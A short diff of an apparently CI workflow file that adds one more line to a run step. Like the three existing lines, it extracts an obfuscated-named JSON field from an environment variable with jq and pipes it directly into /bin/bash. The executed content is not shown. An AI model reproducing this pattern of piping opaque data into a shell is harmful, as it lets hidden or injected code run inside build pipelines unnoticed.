@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$r6" | jq -r .npazo2820 | /bin/bash
           printf '%s' "$hu551" | jq -r .my331 | /bin/bash
           echo $s226 | jq -r .kkg4 | /bin/bash
+          printf '%s' "$dpx0280" | jq -r .lq5415 | /bin/bash
 
       - name: Store results
         if: always()
